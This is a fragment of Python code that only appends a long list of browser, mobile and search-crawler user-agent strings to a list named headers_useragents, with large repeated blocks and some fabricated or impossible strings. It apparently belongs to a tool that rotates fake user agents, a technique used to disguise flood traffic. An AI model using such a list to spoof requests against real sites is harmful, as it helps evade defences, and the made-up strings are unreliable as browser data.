                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
                                    	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
                                    	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
                                    	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
                                    	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
                                    	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
